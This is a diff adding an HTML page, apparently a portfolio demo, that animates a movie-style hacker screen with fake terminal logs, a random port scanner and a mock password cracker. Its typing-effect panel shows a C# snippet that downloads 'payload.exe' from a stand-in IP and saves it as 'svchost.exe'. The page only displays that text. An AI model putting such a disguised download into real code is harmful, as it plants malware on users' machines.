@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>hack</title>
+  <meta name="description" content="شبیه‌سازی صفحه کامپیوتر یک هکر در فیلم‌ها | ترمینال زنده، رادار ماهواره‌ای، شکستن رمز و کد نویسی سی‌شارپ زنده. ساخته شده توسط محمد صادق رضائی.">
+  <meta name="keywords" content="هکر, هک, رادار, ترمینال, ماتریکس, سایبری, امنیت, سی شارپ, C#, محمد صادق رضائی, برنامه نویس, programmer msr">
+  <meta name="author" content="محمد صادق رضائی">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#010206">
+  <link rel="canonical" href="https://www.programmer-msr.ir/hacker.html">
+
+  <!-- Open Graph (For Social Media) -->
+  <meta property="og:type" content="website">
+  <meta property="og:locale" content="fa_IR">
+  <meta property="og:site_name" content="Mohammad Sadegh Rezaei | Programmer MSR">
+  <meta property="og:title" content="hack">
+  <meta property="og:description" content="شبیه‌سازی صفحه کامپیوتر یک هکر در فیلم‌ها با ترمینال زنده و رادار ماهواره‌ای.">
+  <meta property="og:url" content="https://www.programmer-msr.ir/hacker.html">
+  <meta property="og:image" content="https://www.programmer-msr.ir/homeImages/head/msrMedium.jpg">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="hack">
+  <meta name="twitter:description" content="شبیه‌سازی صفحه کامپیوتر یک هکر در فیلم‌ها با ترمینال زنده و رادار ماهواره‌ای.">
+  <meta name="twitter:image" content="https://www.programmer-msr.ir/homeImages/head/msrMedium.jpg">
+
+  <!-- Favicon -->
+  <link rel="icon" href="homeImages/head/msrMedium.jpg" type="image/jpeg">
+  <link rel="shortcut icon" href="homeImages/head/msrMedium.jpg">
+  <link rel="apple-touch-icon" href="homeImages/head/msrMedium.jpg">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+
+    :root {
+      --cyan: #00e5ff;
+      --purple: #b000ff;
+      --red: #ff003c;
+      --green: #00ff41;
+      --bg-dark: #010206;
+      --glass: rgba(0, 10, 20, 0.6);
+      --border: rgba(0, 229, 255, 0.3);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      user-select: none;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--cyan);
+      font-family: 'Share Tech Mono', monospace;
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+      background-image: 
+        radial-gradient(circle at 50% 40%, rgba(0, 50, 150, 0.15) 0%, transparent 60%),
+        radial-gradient(circle at 10% 90%, rgba(176, 0, 255, 0.05) 0%, transparent 40%);
+    }
+
+    /* Backgrounds */
+    #matrix-canvas {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      opacity: 0.15;
+    }
+
+    #core-canvas {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+    }
+
+    .scanlines {
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+      pointer-events: none;
+      background: linear-gradient(to bottom, rgba(255,255,255,0) 50%, rgba(0, 0, 0, 0.3) 50%);
+      background-size: 100% 4px;
+    }
+
+    /* Top Navigation */
+    .top-nav {
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 50px;
+      z-index: 10;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 20px;
+      background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, transparent 100%);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .brand {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 15px;
+      font-weight: 900;
+      color: #fff;
+      letter-spacing: 2px;
+      text-shadow: 0 0 10px var(--cyan);
+    }
+    .brand span { color: var(--red); }
+
+    .nav-stats {
+      display: flex;
+      gap: 20px;
+      font-size: 13px;
+    }
+    .nav-stats span { color: var(--cyan); }
+    .nav-stats .alert { color: var(--red); animation: blink 1s step-end infinite; }
+
+    .disconnect-btn {
+      color: var(--cyan);
+      text-decoration: none;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 12px;
+      border: 1px solid var(--cyan);
+      padding: 5px 12px;
+      transition: 0.3s;
+      box-shadow: 0 0 10px rgba(0,229,255,0.2);
+    }
+    .disconnect-btn:hover {
+      background: var(--cyan);
+      color: #000;
+      box-shadow: 0 0 20px var(--cyan);
+    }
+
+    /* Side HUDs */
+    .left-hud {
+      position: absolute;
+      left: 20px;
+      top: 70px;
+      bottom: 20px;
+      width: 280px;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      pointer-events: none;
+    }
+
+    .right-hud {
+      position: absolute;
+      right: 20px;
+      top: 70px;
+      bottom: 20px;
+      width: 280px;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      pointer-events: none;
+    }
+
+    .panel {
+      background: var(--glass);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: inset 0 0 20px rgba(0, 229, 255, 0.05);
+      pointer-events: auto;
+      position: relative;
+    }
+
+    .panel-header {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 11px;
+      letter-spacing: 1px;
+      background: rgba(0, 229, 255, 0.1);
+      padding: 6px 10px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      color: #fff;
+      z-index: 2;
+    }
+
+    /* --- LEFT PANELS --- */
+    .terminal-panel { flex: 0.8; }
+    .terminal {
+      flex: 1;
+      padding: 10px;
+      font-size: 12px;
+      line-height: 1.5;
+      overflow-y: hidden;
+      color: var(--cyan);
+    }
+    .t-line { margin-bottom: 4px; }
+    .t-cmd { color: #fff; }
+    .t-err { color: var(--red); text-shadow: 0 0 5px var(--red); }
+    .t-ok { color: var(--cyan); text-shadow: 0 0 5px var(--cyan); }
+
+    .scanner-panel { flex: 1; }
+    .scanner-content {
+      flex: 1;
+      padding: 10px;
+      font-size: 12px;
+      line-height: 1.5;
+      overflow-y: hidden;
+      position: relative;
+    }
+    .scan-line-effect {
+      position: absolute;
+      left: 0; right: 0;
+      height: 2px;
+      background: rgba(0, 229, 255, 0.4);
+      box-shadow: 0 0 15px var(--cyan);
+      animation: scan-effect 3s linear infinite;
+      z-index: 1;
+    }
+    @keyframes scan-effect {
+      0% { top: 0; opacity: 0; }
+      10% { opacity: 1; }
+      90% { opacity: 1; }
+      100% { top: 100%; opacity: 0; }
+    }
+    .port-line {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 4px;
+      animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+    .port-open { color: var(--red); text-shadow: 0 0 8px var(--red); font-weight: bold; }
+    .port-closed { color: #777; }
+    .port-num { color: var(--cyan); }
+
+    .decrypt-panel { flex: 1.2; }
+    .decrypt-content {
+      flex: 1;
+      padding: 10px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .decrypt-file-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      margin-bottom: 5px;
+      color: #fff;
+    }
+    .decrypt-bar-bg {
+      height: 6px;
+      background: rgba(0, 229, 255, 0.1);
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+    .decrypt-bar-fill {
+      height: 100%;
+      background: var(--cyan);
+      box-shadow: 0 0 10px var(--cyan);
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+    .hex-dump {
+      flex: 1;
+      font-size: 11px;
+      line-height: 1.5;
+      color: var(--purple);
+      text-shadow: 0 0 5px rgba(176, 0, 255, 0.5);
+      overflow: hidden;
+      font-family: 'Share Tech Mono', monospace;
+      letter-spacing: 1px;
+    }
+    .hex-line {
+      animation: fadeIn 0.2s ease;
+      white-space: nowrap;
+    }
+
+    /* --- RIGHT PANELS --- */
+    .stats-panel {
+      padding: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .stat-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      margin-bottom: 2px;
+    }
+    .bar-bg {
+      height: 4px;
+      background: rgba(0, 229, 255, 0.1);
+      width: 100%;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+    .bar-fill {
+      height: 100%;
+      background: var(--cyan);
+      box-shadow: 0 0 10px var(--cyan);
+      width: 0%;
+      transition: width 0.3s;
+    }
+    .bar-fill.red { background: var(--red); box-shadow: 0 0 10px var(--red); }
+
+    .right-top-panel { flex: 0 0 auto; }
+    .right-mid-panel { flex: 0.8; }
+    .radar-container {
+      flex: 1;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .radar-circle {
+      width: 100px;
+      height: 100px;
+      border: 1px solid var(--cyan);
+      border-radius: 50%;
+      position: relative;
+      overflow: hidden;
+    }
+    .radar-sweep {
+      position: absolute;
+      inset: 0;
+      background: conic-gradient(from 0deg, transparent 0deg, rgba(0, 229, 255, 0.3) 90deg, transparent 90deg);
+      animation: radar-sweep 2s linear infinite;
+    }
+    @keyframes radar-sweep { 100% { transform: rotate(360deg); } }
+    .radar-target {
+      position: absolute;
+      width: 4px; height: 4px;
+      background: var(--red);
+      border-radius: 50%;
+      box-shadow: 0 0 8px var(--red);
+    }
+
+    .right-bot-panel { flex: 1.2; }
+    .brute-content {
+      flex: 1;
+      padding: 10px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .brute-label {
+      font-size: 11px;
+      color: #888;
+      margin-bottom: 5px;
+    }
+    .brute-output {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.3rem;
+      font-weight: bold;
+      letter-spacing: 2px;
+      text-align: center;
+      margin-bottom: 15px;
+      white-space: nowrap;
+      min-height: 30px;
+    }
+    .char-cracking { color: #777; text-shadow: none; }
+    .char-cracked { color: var(--cyan); text-shadow: 0 0 10px var(--cyan); }
+    .brute-success { color: var(--red); text-shadow: 0 0 15px var(--red); animation: blink 0.2s infinite; }
+    .attempt-info {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: var(--cyan);
+      margin-top: 5px;
+    }
+
+    /* --- CENTER UI (Aligned Bottom) --- */
+    .center-wrapper {
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 5;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 600px;
+      pointer-events: none;
+    }
+
+    .center-glitch {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .glitch-text {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 3.5rem;
+      font-weight: 900;
+      color: #fff;
+      text-transform: uppercase;
+      position: relative;
+      text-shadow: 0 0 30px var(--cyan), 0 0 60px var(--purple);
+      letter-spacing: 5px;
+      line-height: 1.1;
+      white-space: pre-wrap;
+    }
+
+    .glitch-text::before, .glitch-text::after {
+      content: attr(data-text);
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      white-space: pre-wrap;
+    }
+    .glitch-text::before {
+      left: 4px; text-shadow: -2px 0 var(--red);
+      clip-path: inset(20% 0 60% 0);
+      animation: glitch-1 2s infinite linear alternate-reverse;
+    }
+    .glitch-text::after {
+      left: -4px; text-shadow: 2px 0 var(--cyan);
+      clip-path: inset(80% 0 5% 0);
+      animation: glitch-2 3s infinite linear alternate-reverse;
+    }
+
+    @keyframes glitch-1 {
+      0% { clip-path: inset(20% 0 60% 0); }
+      20% { clip-path: inset(80% 0 5% 0); }
+      40% { clip-path: inset(40% 0 30% 0); }
+      60% { clip-path: inset(10% 0 70% 0); }
+      80% { clip-path: inset(90% 0 10% 0); }
+      100% { clip-path: inset(50% 0 40% 0); }
+    }
+    @keyframes glitch-2 {
+      0% { clip-path: inset(80% 0 5% 0); }
+      20% { clip-path: inset(30% 0 50% 0); }
+      40% { clip-path: inset(60% 0 20% 0); }
+      60% { clip-path: inset(10% 0 80% 0); }
+      80% { clip-path: inset(40% 0 40% 0); }
+      100% { clip-path: inset(70% 0 10% 0); }
+    }
+
+    .sub-text {
+      color: var(--red);
+      font-size: 1.1rem;
+      letter-spacing: 8px;
+      margin-top: 5px;
+      animation: blink 1s step-end infinite;
+      text-shadow: 0 0 10px var(--red);
+    }
+
+    @keyframes blink { 50% { opacity: 0; } }
+
+    /* C# Code Panel */
+    .code-panel {
+      width: 100%;
+      background: rgba(0, 8, 15, 0.4);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      box-shadow: 0 0 30px rgba(0, 229, 255, 0.1);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      pointer-events: auto;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .code-content {
+      padding: 15px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 15px;
+      line-height: 1.6;
+      color: #e0e0e0;
+      height: 180px;
+      overflow: hidden;
+      text-align: left;
+      direction: ltr;
+    }
+
+    /* C# Syntax Highlighting */
+    .kw { color: #569cd6; } 
+    .cls { color: #4ec9b0; } 
+    .str { color: #ce9178; } 
+    .fn { color: #dcdcaa; } 
+    .cmt { color: #6a9955; } 
+
+    .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 17px;
+      background-color: var(--cyan);
+      animation: blink-cursor 1s step-end infinite;
+      vertical-align: middle;
+    }
+    @keyframes blink-cursor { 50% { opacity: 0; } }
+
+    /* Responsive */
+    @media (max-width: 900px) {
+      .left-hud, .right-hud { display: none; }
+      .glitch-text { font-size: 2.5rem; }
+      .center-wrapper { bottom: 20px; }
+    }
+    @media (max-width: 500px) {
+      .glitch-text { font-size: 1.8rem; letter-spacing: 2px; }
+      .sub-text { font-size: 0.9rem; letter-spacing: 4px; }
+      .code-content { font-size: 12px; height: 150px; }
+    }
+  </style>
+</head>
+<body>
+
+  <canvas id="matrix-canvas"></canvas>
+  <canvas id="core-canvas"></canvas>
+  <div class="scanlines"></div>
+
+  <div class="top-nav">
+    <div class="brand">CYBER<span>_</span>HUD</div>
+    <div class="nav-stats">
+      <div>FIREWALL: <span class="alert">BYPASSED</span></div>
+      <div>IP: <span id="ip">10.0.0.1</span></div>
+    </div>
+    <a href="https://www.programmer-msr.ir/" class="disconnect-btn">DISCONNECT</a>
+  </div>
+
+  <!-- Left Panels -->
+  <div class="left-hud">
+    <div class="panel terminal-panel">
+      <div class="panel-header">
+        <span>ROOT@SYSTEM:~#</span>
+        <span style="color:var(--red)">AES-256</span>
+      </div>
+      <div class="terminal" id="terminal-output">
+        <div class="t-line t-cmd">root@sys:~# ./inject.sh</div>
+        <div class="t-line t-ok">[OK] Payload deployed.</div>
+      </div>
+    </div>
+
+    <div class="panel scanner-panel">
+      <div class="panel-header">
+        <span>PORT SCANNER</span>
+        <span style="color:var(--red)">RUNNING</span>
+      </div>
+      <div class="scanner-content" id="scanner-output">
+        <div class="scan-line-effect"></div>
+      </div>
+    </div>
+
+    <div class="panel decrypt-panel">
+      <div class="panel-header">
+        <span>PAYLOAD DECRYPT</span>
+        <span style="color:var(--cyan)">ACTIVE</span>
+      </div>
+      <div class="decrypt-content">
+        <div class="decrypt-file-row">
+          <span id="current-file">mainframe.db</span>
+          <span id="decrypt-percent" style="color:var(--cyan)">0%</span>
+        </div>
+        <div class="decrypt-bar-bg">
+          <div class="decrypt-bar-fill" id="decrypt-bar"></div>
+        </div>
+        <div class="hex-dump" id="hex-dump"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Center UI (Glitch text + Code Panel) -->
+  <div class="center-wrapper">
+    
+    <div class="center-glitch">
+      <div class="glitch-text" data-text="SYSTEM&#10;OVERRIDE">SYSTEM<br>OVERRIDE</div>
+      <div class="sub-text">UNAUTHORIZED ACCESS</div>
+    </div>
+
+    <!-- C# Code Panel -->
+    <div class="code-panel">
+      <div class="panel-header">
+        <span>EXPLOIT.cs</span>
+        <span style="color:var(--cyan)">C# COMPILER</span>
+      </div>
+      <div class="code-content" id="code-editor"></div>
+    </div>
+
+  </div>
+
+  <!-- Right Panels -->
+  <div class="right-hud">
+    <div class="panel right-top-panel">
+      <div class="panel-header">
+        <span>SYS RESOURCES</span>
+        <span>LIVE</span>
+      </div>
+      <div class="stats-panel">
+        <div>
+          <div class="stat-row"><span>CPU LOAD</span><span id="val-cpu">85%</span></div>
+          <div class="bar-bg"><div class="bar-fill" id="bar-cpu" style="width:85%"></div></div>
+        </div>
+        <div>
+          <div class="stat-row"><span>MEMORY</span><span id="val-ram">60%</span></div>
+          <div class="bar-bg"><div class="bar-fill" id="bar-ram" style="width:60%"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel right-mid-panel">
+      <div class="panel-header">
+        <span>SATELLITE UPLINK</span>
+        <span>LOCKED</span>
+      </div>
+      <div class="radar-container">
+        <div class="radar-circle">
+          <div class="radar-sweep"></div>
+          <div class="radar-target" id="trg1" style="top:30%; left:40%"></div>
+          <div class="radar-target" id="trg2" style="top:70%; left:80%"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel right-bot-panel">
+      <div class="panel-header">
+        <span>BRUTE FORCE</span>
+        <span style="color:var(--red)" id="brute-status">RUNNING</span>
+      </div>
+      <div class="brute-content">
+        <div class="brute-label">TARGET: root@admin</div>
+        <div class="brute-output" id="brute-output"></div>
+        <div class="bar-bg">
+          <div class="bar-fill" id="brute-bar" style="width:0%"></div>
+        </div>
+        <div class="attempt-info">
+          <span>ATTEMPTS</span>
+          <span id="attempt-count">0</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /* ==========================================================
+       1. BACKGROUND MATRIX
+       ========================================================== */
+    const bgCanvas = document.getElementById('matrix-canvas');
+    const bgCtx = bgCanvas.getContext('2d');
+    bgCanvas.width = window.innerWidth;
+    bgCanvas.height = window.innerHeight;
+
+    const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()_+{}[]|';
+    const fontSize = 14;
+    let columns = bgCanvas.width / fontSize;
+    let drops = Array(Math.ceil(columns)).fill(1);
+
+    function drawMatrix() {
+      bgCtx.fillStyle = 'rgba(1, 2, 6, 0.1)';
+      bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
+      bgCtx.fillStyle = '#00e5ff';
+      bgCtx.font = fontSize + 'px Share Tech Mono';
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = chars.charAt(Math.floor(Math.random() * chars.length));
+        bgCtx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > bgCanvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+    setInterval(drawMatrix, 40);
+
+    /* ==========================================================
+       2. CENTER CORE CANVAS (3D Rotating Sphere)
+       ========================================================== */
+    const coreCanvas = document.getElementById('core-canvas');
+    const cCtx = coreCanvas.getContext('2d');
+    
+    function resizeCore() {
+      coreCanvas.width = window.innerWidth;
+      coreCanvas.height = window.innerHeight;
+    }
+    resizeCore();
+
+    const points = [];
+    const numPoints = 180;
+    const radius = Math.min(window.innerWidth, window.innerHeight) * 0.35;
+    
+    for (let i = 0; i < numPoints; i++) {
+      const theta = Math.acos(1 - 2 * (i + 0.5) / numPoints);
+      const phi = Math.PI * (1 + Math.sqrt(5)) * i;
+      points.push({
+        x: radius * Math.sin(theta) * Math.cos(phi),
+        y: radius * Math.sin(theta) * Math.sin(phi),
+        z: radius * Math.cos(theta)
+      });
+    }
+
+    let rotation = 0;
+
+    function drawCore() {
+      cCtx.clearRect(0, 0, coreCanvas.width, coreCanvas.height);
+      
+      const cx = coreCanvas.width / 2;
+      const cy = coreCanvas.height * 0.38; 
+      
+      rotation += 0.003;
+      const cos = Math.cos(rotation);
+      const sin = Math.sin(rotation);
+
+      cCtx.lineWidth = 0.5;
+      for (let i = 0; i < points.length; i++) {
+        for (let j = i + 1; j < points.length; j++) {
+          const dx = points[i].x - points[j].x;
+          const dy = points[i].y - points[j].y;
+          const dz = points[i].z - points[j].z;
+          const dist = Math.sqrt(dx*dx + dy*dy + dz*dz);
+          
+          if (dist < radius * 0.45) {
+            const x1 = points[i].x * cos - points[i].z * sin;
+            const z1 = points[i].x * sin + points[i].z * cos;
+            const y1 = points[i].y;
+            
+            const x2 = points[j].x * cos - points[j].z * sin;
+            const z2 = points[j].x * sin + points[j].z * cos;
+            const y2 = points[j].y;
+
+            const scale1 = 500 / (500 - z1);
+            const scale2 = 500 / (500 - z2);
+
+            cCtx.beginPath();
+            cCtx.moveTo(cx + x1 * scale1, cy + y1 * scale1);
+            cCtx.lineTo(cx + x2 * scale2, cy + y2 * scale2);
+            
+            const alpha = Math.max(0.05, 1 - (z1 + radius) / (radius * 2));
+            cCtx.strokeStyle = `rgba(0, 229, 255, ${alpha * 0.4})`;
+            cCtx.stroke();
+          }
+        }
+      }
+
+      for (let i = 0; i < points.length; i++) {
+        const x = points[i].x * cos - points[i].z * sin;
+        const z = points[i].x * sin + points[i].z * cos;
+        const y = points[i].y;
+        
+        const scale = 500 / (500 - z);
+        const px = cx + x * scale;
+        const py = cy + y * scale;
+        
+        cCtx.fillStyle = `rgba(0, 229, 255, ${Math.max(0.2, 1 - (z + radius) / (radius * 2))})`;
+        cCtx.beginPath();
+        cCtx.arc(px, py, z > 0 ? 2.5 : 1.5, 0, Math.PI * 2);
+        cCtx.fill();
+      }
+
+      requestAnimationFrame(drawCore);
+    }
+    drawCore();
+
+    /* ==========================================================
+       3. C# CODE TYPING EFFECT
+       ========================================================== */
+    const codeEditor = document.getElementById('code-editor');
+    
+    const csharpCode = `using System;
+using System.Net;
+
+namespace Exploit {
+  class Program {
+    static void Main() {
+      Console.WriteLine("Bypassing firewall...");
+      WebClient client = new WebClient();
+      client.DownloadFile("http://10.0.0.1/payload.exe", "svchost.exe");
+      Console.WriteLine("Root access acquired.");
+    }
+  }
+}`;
+
+    function highlightCSharp(text) {
+      return text
+        .replace(/\b(using|namespace|class|static|void|new)\b/g, '<span class="kw">$1</span>')
+        .replace(/\b(System|Net|Program|WebClient|Console)\b/g, '<span class="cls">$1</span>')
+        .replace(/(".*?")/g, '<span class="str">$1</span>')
+        .replace(/\b(Main|WriteLine|DownloadFile)\b/g, '<span class="fn">$1</span>');
+    }
+
+    let charIndex = 0;
+    let isTyping = true;
+
+    function typeCode() {
+      if (!isTyping) return;
+
+      if (charIndex < csharpCode.length) {
+        charIndex++;
+        let currentText = csharpCode.substring(0, charIndex);
+        codeEditor.innerHTML = highlightCSharp(currentText) + '<span class="cursor"></span>';
+        setTimeout(typeCode, Math.random() * 50 + 20);
+      } else {
+        setTimeout(() => {
+          charIndex = 0;
+          codeEditor.innerHTML = '';
+          typeCode();
+        }, 4000);
+      }
+    }
+    
+    setTimeout(typeCode, 1000);
+
+
+    /* ==========================================================
+       4. TERMINAL LOGGER
+       ========================================================== */
+    const terminal = document.getElementById('terminal-output');
+    const logs = [
+      "Bypassing node...", "SQL injection OK.", "Decrypting RSA...",
+      "Port 22 open.", "Escalating privileges...", "Spoofing MAC...", 
+      "Routing via TOR...", "WARNING: Trace detected!", "Root acquired."
+    ];
+
+    setInterval(() => {
+      const line = document.createElement('div');
+      const msg = logs[Math.floor(Math.random() * logs.length)];
+      
+      if (msg.includes('WARNING')) line.className = 't-line t-err';
+      else if (msg.includes('acquired')) line.className = 't-line t-ok';
+      else if (Math.random() > 0.7) line.className = 't-line t-cmd';
+      else line.className = 't-line';
+
+      line.textContent = (line.classList.contains('t-cmd') ? 'root@sys:~# ' : '> ') + msg;
+      terminal.appendChild(line);
+
+      if (terminal.children.length > 5) terminal.removeChild(terminal.firstChild);
+    }, 800);
+
+    /* ==========================================================
+       5. PORT SCANNER LOGIC
+       ========================================================== */
+    const scannerOutput = document.getElementById('scanner-output');
+    
+    setInterval(() => {
+      const line = document.createElement('div');
+      line.className = 'port-line';
+      
+      const port = Math.floor(Math.random() * 65000) + 20;
+      const isOpen = Math.random() < 0.15;
+      
+      if (isOpen) {
+        line.innerHTML = `<span class="port-num">Port ${port}</span> <span class="port-open">[ OPEN ]</span>`;
+      } else {
+        line.innerHTML = `<span class="port-num">Port ${port}</span> <span class="port-closed">[ CLOSED ]</span>`;
+      }
+      
+      scannerOutput.appendChild(line);
+
+      const lines = scannerOutput.querySelectorAll('.port-line');
+      if (lines.length > 5) lines[0].remove();
+    }, 300);
+
+    /* ==========================================================
+       6. PAYLOAD DECRYPT & HEX DUMP LOGIC
+       ========================================================== */
+    const decryptBar = document.getElementById('decrypt-bar');
+    const decryptPercent = document.getElementById('decrypt-percent');
+    const currentFile = document.getElementById('current-file');
+    const hexDump = document.getElementById('hex-dump');
+
+    const fakeFiles = ['mainframe_db.sql', 'admin_keys.pem', 'blueprints.pdf', 'sys_config.cfg'];
+    let currentFileIndex = 0;
+    let progress = 0;
+
+    setInterval(() => {
+      progress += Math.random() * 5;
+      
+      if (progress >= 100) {
+        progress = 0;
+        currentFileIndex = (currentFileIndex + 1) % fakeFiles.length;
+        currentFile.textContent = fakeFiles[currentFileIndex];
+        decryptBar.style.backgroundColor = 'var(--cyan)';
+        decryptBar.style.boxShadow = '0 0 10px var(--cyan)';
+      } else if (progress > 90) {
+        decryptBar.style.backgroundColor = 'var(--red)';
+        decryptBar.style.boxShadow = '0 0 10px var(--red)';
+      }
+
+      decryptBar.style.width = progress + '%';
+      decryptPercent.textContent = Math.floor(progress) + '%';
+    }, 200);
+
+    function generateHexLine() {
+      const chars = '0123456789ABCDEF';
+      let hexStr = '';
+      for (let i = 0; i < 8; i++) {
+        hexStr += chars[Math.floor(Math.random() * 16)];
+        hexStr += chars[Math.floor(Math.random() * 16)];
+        hexStr += ' ';
+      }
+      
+      const line = document.createElement('div');
+      line.className = 'hex-line';
+      line.textContent = hexStr;
+      hexDump.appendChild(line);
+
+      if (hexDump.children.length > 8) hexDump.removeChild(hexDump.firstChild);
+    }
+    setInterval(generateHexLine, 120);
+
+    /* ==========================================================
+       7. BRUTE FORCE PASSWORD CRACKER
+       ========================================================== */
+    const bruteOutput = document.getElementById('brute-output');
+    const bruteBar = document.getElementById('brute-bar');
+    const attemptCount = document.getElementById('attempt-count');
+    const bruteStatus = document.getElementById('brute-status');
+
+    const TARGET_PASS = "P@ssw0rd!";
+    const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
+    let crackedLength = 0;
+    let attempts = 0;
+
+    function generateBruteString() {
+      let result = "";
+      for (let i = 0; i < TARGET_PASS.length; i++) {
+        if (i < crackedLength) {
+          result += `<span class="char-cracked">${TARGET_PASS[i]}</span>`;
+        } else {
+          const randomChar = CHARS[Math.floor(Math.random() * CHARS.length)];
+          result += `<span class="char-cracking">${randomChar}</span>`;
+        }
+      }
+      return result;
+    }
+
+    setInterval(() => {
+      attempts += Math.floor(Math.random() * 500) + 100;
+      attemptCount.textContent = attempts.toLocaleString();
+
+      if (Math.random() < 0.03) {
+        crackedLength++;
+        
+        if (crackedLength > TARGET_PASS.length) {
+          bruteStatus.textContent = "SUCCESS";
+          bruteStatus.style.color = "var(--cyan)";
+          bruteOutput.innerHTML = `<span class="brute-success">${TARGET_PASS}</span>`;
+          bruteBar.style.width = "100%";
+          bruteBar.style.background = "var(--cyan)";
+          
+          setTimeout(() => {
+            crackedLength = 0;
+            attempts = 0;
+            bruteStatus.textContent = "RUNNING";
+            bruteStatus.style.color = "var(--red)";
+            bruteBar.style.width = "0%";
+            bruteBar.style.background = "var(--red)";
+          }, 2500);
+        }
+      }
+
+      if (crackedLength <= TARGET_PASS.length) {
+        bruteOutput.innerHTML = generateBruteString();
+        let percent = (crackedLength / TARGET_PASS.length) * 100;
+        bruteBar.style.width = percent + "%";
+      }
+    }, 50);
+
+    /* ==========================================================
+       8. RANDOM STATS & IP
+       ========================================================== */
+    setInterval(() => {
+      const cpu = Math.floor(Math.random() * 20) + 75;
+      const ram = Math.floor(Math.random() * 30) + 50;
+
+      document.getElementById('val-cpu').textContent = cpu + '%';
+      document.getElementById('bar-cpu').style.width = cpu + '%';
+      
+      document.getElementById('val-ram').textContent = ram + '%';
+      document.getElementById('bar-ram').style.width = ram + '%';
+
+      document.getElementById('trg1').style.top = Math.floor(Math.random() * 80 + 10) + '%';
+      document.getElementById('trg1').style.left = Math.floor(Math.random() * 80 + 10) + '%';
+      document.getElementById('trg2').style.top = Math.floor(Math.random() * 80 + 10) + '%';
+      document.getElementById('trg2').style.left = Math.floor(Math.random() * 80 + 10) + '%';
+
+      document.getElementById('ip').textContent = `10.0.0.${Math.floor(Math.random() * 255)}`;
+    }, 1500);
+
+    window.addEventListener('resize', () => {
+      bgCanvas.width = window.innerWidth;
+      bgCanvas.height = window.innerHeight;
+      columns = bgCanvas.width / fontSize;
+      drops = Array(Math.ceil(columns)).fill(1);
+      resizeCore();
+    });
+  </script>
+</body>
+</html>
